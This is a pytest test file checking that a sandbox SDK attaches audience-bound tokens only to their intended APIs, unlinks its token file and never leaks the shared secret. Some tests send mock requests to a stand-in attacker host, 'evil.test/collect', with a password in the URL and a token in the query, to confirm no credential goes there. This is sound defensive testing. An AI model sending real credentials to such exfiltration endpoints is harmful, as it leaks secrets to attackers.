"""The SDK's per-execution credential — genetics-results-suite-4h6.44.

The supervisor writes /scratch/<execution_id>/tokens.json (O_EXCL|O_NOFOLLOW, 0600) BEFORE it
forks and names the PATH, never the tokens, to the child under `SANDBOX_TOKEN_FILE`. This is the
other half: read that file once, unlink it, and attach the token BOUND TO THE DESTINATION.

Why it is not cosmetic. results-api charges its four per-execution counters only when
`_sandbox_principal` resolves an HS256 sandbox token; `is_internal_caller` accepts
INTERNAL_API_SECRET and short-circuits above that, so a sandbox request carrying the shared
secret is served 200 as `mcp-tool` with `sandbox_budget._executions == {}` — no accounting at all
(genetics-results-suite-0lf). So "auth works" is exactly the wrong assertion here, and these
tests assert on the header that is actually put on the wire, per destination.

READ-ONCE-AND-UNLINK IS NOT AN EXPOSURE BOUND — see `_load_sandbox_tokens`. Nothing here should
be read as measuring one.
"""

import json
import logging
import os

import httpx
import pytest

from genetics_mcp_server.tools import executor as executor_mod
from genetics_mcp_server.tools.executor import SandboxCredentialError, ToolExecutor

RESULTS_API = "http://results-api.test:4000/api"
DB_API = "http://db-api.test:8080"

DB_TOKEN = "db.api.token"
RESULTS_TOKEN = "results.api.token"


@pytest.fixture(autouse=True)
def _fresh_token_state(monkeypatch):
    """The read is once-per-process by design, so every test starts from a cleared memo."""
    executor_mod._reset_sandbox_tokens()
    monkeypatch.delenv("SANDBOX_TOKEN_FILE", raising=False)
    monkeypatch.setenv("GENETICS_API_URL", RESULTS_API)
    monkeypatch.setenv("BIGQUERY_API_URL", DB_API)
    yield
    executor_mod._reset_sandbox_tokens()


def _write_tokens(tmp_path, body=None):
    path = tmp_path / "tokens.json"
    if body is None:
        body = {"db-api": DB_TOKEN, "results-api": RESULTS_TOKEN}
    path.write_text(json.dumps(body))
    os.chmod(path, 0o600)
    return path


def _capturing(executor):
    """Swap in a MockTransport so the request is built and authenticated for real.

    The auth flow runs inside `AsyncClient.send`, so asserting on `client.headers` would not
    see it at all — a per-destination credential cannot be a default header.
    """
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json={})

    executor.client._transport = httpx.MockTransport(handler)
    return seen


async def _get(executor, url):
    return await executor.client.get(url)


def _auth_of(request):
    return request.headers.get("Authorization")


@pytest.mark.asyncio
async def test_each_destination_gets_its_own_audience_bound_token(tmp_path, monkeypatch):
    """The two tokens are NOT interchangeable: `aud` is checked exactly at
    genetics-results-db api/sandbox_auth.py (AUDIENCE = "db-api") and genetics-results-api
    app/core/sandbox_token.py (AUDIENCE = "results-api"), and both refuse a list-valued `aud`,
    so a crossed token is a hard 401 rather than a degraded success."""
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(_write_tokens(tmp_path)))
    executor = ToolExecutor()
    seen = _capturing(executor)

    await _get(executor, f"{RESULTS_API}/v1/rsid/variants")
    await _get(executor, f"{DB_API}/query")

    assert _auth_of(seen[0]) == f"Bearer {RESULTS_TOKEN}"
    assert _auth_of(seen[1]) == f"Bearer {DB_TOKEN}"
    await executor.close()


@pytest.mark.asyncio
async def test_the_internal_secret_is_not_attached_when_a_token_file_exists(
    tmp_path, monkeypatch
):
    """The regression that matters. A sandbox that held both would keep being served by
    `is_internal_caller` with `sandbox_budget._executions` empty, and every quota control
    above it would stay inert while looking enforced."""
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(_write_tokens(tmp_path)))
    monkeypatch.setenv("INTERNAL_API_SECRET", "the-shared-secret")
    executor = ToolExecutor()
    seen = _capturing(executor)

    await _get(executor, f"{RESULTS_API}/v1/resources")

    assert _auth_of(seen[0]) == f"Bearer {RESULTS_TOKEN}"
    assert "the-shared-secret" not in str(seen[0].headers)
    await executor.close()


@pytest.mark.asyncio
async def test_the_token_file_is_read_once_and_unlinked(tmp_path, monkeypatch):
    path = _write_tokens(tmp_path)
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(path))
    executor = ToolExecutor()
    seen = _capturing(executor)

    assert not path.exists(), "the token file survived the first client build"

    # and the credential still works for the rest of the execution, from memory
    await _get(executor, f"{RESULTS_API}/v1/resources")
    await _get(executor, f"{DB_API}/schema")
    assert _auth_of(seen[0]) == f"Bearer {RESULTS_TOKEN}"
    assert _auth_of(seen[1]) == f"Bearer {DB_TOKEN}"

    second = ToolExecutor()
    _capturing(second)
    await _get(second, f"{RESULTS_API}/v1/resources")
    await second.close()
    await executor.close()


@pytest.mark.asyncio
async def test_an_unknown_destination_gets_no_credential(tmp_path, monkeypatch, caplog):
    """Egress is deny-by-default in the pod, but a client that would attach a bearer to any
    host is an exfiltration primitive whether or not egress currently stops it."""
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(_write_tokens(tmp_path)))
    executor = ToolExecutor()
    seen = _capturing(executor)

    with caplog.at_level(logging.WARNING):
        await _get(executor, "http://evil.test/collect")

    assert _auth_of(seen[0]) is None
    assert any("no per-execution token matches" in r.message for r in caplog.records)
    await executor.close()


@pytest.mark.asyncio
async def test_the_warning_does_not_log_url_userinfo(tmp_path, monkeypatch, caplog):
    """The unmatched-destination warning names the origin, and the origin is rebuilt from
    scheme/host/port. Blanking the path off the request URL instead keeps userinfo, which
    puts a caller-supplied password on a log line."""
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(_write_tokens(tmp_path)))
    executor = ToolExecutor()
    _capturing(executor)

    with caplog.at_level(logging.WARNING):
        await _get(executor, "http://user:hunter2@evil.test/collect?tok=abc")

    logged = " ".join(r.getMessage() for r in caplog.records)
    assert "http://evil.test" in logged
    assert "hunter2" not in logged
    assert "user@" not in logged
    assert "tok=abc" not in logged
    await executor.close()


@pytest.mark.asyncio
async def test_the_path_prefix_matches_whole_segments(tmp_path, monkeypatch):
    """Co-located upstreams: the path prefix must match whole SEGMENTS.

    With GENETICS_API_URL=/api and BIGQUERY_API_URL=/api/bq on one origin, a bare
    `startswith` made /api/bqx a match for /api/bq and handed out the DB-API token — the
    WRONG AUDIENCE for a path that belongs to results-api — and made /apiary a match for
    /api, handing a token to a path no base URL covers at all. The `sorted()`
    longest-prefix-first ordering exists to make this co-located layout work, so the
    matching rule has to support it rather than only appear to.
    """
    origin = "http://svc.test:4000"
    monkeypatch.setenv("GENETICS_API_URL", f"{origin}/api")
    monkeypatch.setenv("BIGQUERY_API_URL", f"{origin}/api/bq")
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(_write_tokens(tmp_path)))
    executor = ToolExecutor()
    seen = _capturing(executor)

    await _get(executor, f"{origin}/api/bq/query")  # the real db-api destination
    await _get(executor, f"{origin}/api/bq")  # the base URL itself
    await _get(executor, f"{origin}/api/bqx/steal")  # sibling of it, still under /api
    await _get(executor, f"{origin}/apiary")  # sibling of /api, under neither
    await _get(executor, f"{origin}/api/v1/resources")

    assert _auth_of(seen[0]) == f"Bearer {DB_TOKEN}"
    assert _auth_of(seen[1]) == f"Bearer {DB_TOKEN}"
    assert _auth_of(seen[2]) == f"Bearer {RESULTS_TOKEN}", "/api/bqx is not under /api/bq"
    assert _auth_of(seen[3]) is None, "/apiary is not under /api"
    assert _auth_of(seen[4]) == f"Bearer {RESULTS_TOKEN}"
    await executor.close()


@pytest.mark.parametrize(
    "body",
    [
        pytest.param({"results-api": RESULTS_TOKEN}, id="db-api token missing"),
        pytest.param({"db-api": DB_TOKEN, "results-api": ""}, id="empty token"),
        pytest.param({"db-api": DB_TOKEN, "results-api": ["a"]}, id="not a string"),
    ],
)
def test_an_incomplete_token_file_raises_rather_than_going_uncredentialed(
    tmp_path, monkeypatch, body
):
    """An uncredentialed run is the case that reaches db-api's pre-existing fail-open branch,
    and its only other symptom is a bare 401 that names no cause."""
    path = _write_tokens(tmp_path, body)
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(path))
    with pytest.raises(SandboxCredentialError):
        ToolExecutor().client
    assert not path.exists(), "a rejected token file must still be unlinked"


def test_a_missing_token_file_raises(tmp_path, monkeypatch):
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(tmp_path / "absent.json"))
    with pytest.raises(SandboxCredentialError):
        ToolExecutor().client


def test_the_failure_is_remembered_rather_than_retried(tmp_path, monkeypatch):
    """The file is gone after the first attempt, so a retry would report a different, more
    confusing cause than the real one."""
    monkeypatch.setenv("SANDBOX_TOKEN_FILE", str(_write_tokens(tmp_path, {})))
    first = pytest.raises(SandboxCredentialError)
    with first:
        ToolExecutor().client
    with pytest.raises(SandboxCredentialError) as second:
        ToolExecutor().client
    assert str(second.value) == str(first.excinfo.value)


def test_no_token_file_and_no_secret_says_so(monkeypatch, caplog):
    """The silent fallback named by the bead. `executor.py` built an Authorization header only
    when INTERNAL_API_SECRET was set and otherwise sent none, and the sandbox install was
    excluded from the warning — so once the anonymous surface closes, the symptom is a bare 401
    with nothing local naming the cause."""
    monkeypatch.delenv("INTERNAL_API_SECRET", raising=False)
    with caplog.at_level(logging.WARNING):
        client = ToolExecutor().client
    assert "Authorization" not in client.headers
    assert any("SANDBOX_TOKEN_FILE" in r.getMessage() for r in caplog.records)


@pytest.mark.asyncio
async def test_the_secret_path_is_untouched_when_no_token_file_exists(monkeypatch):
    monkeypatch.setenv("INTERNAL_API_SECRET", "the-shared-secret")
    executor = ToolExecutor()
    assert executor.client.headers.get("Authorization") == "Bearer the-shared-secret"
    assert "Authorization" not in executor.external_client.headers
    await executor.close()
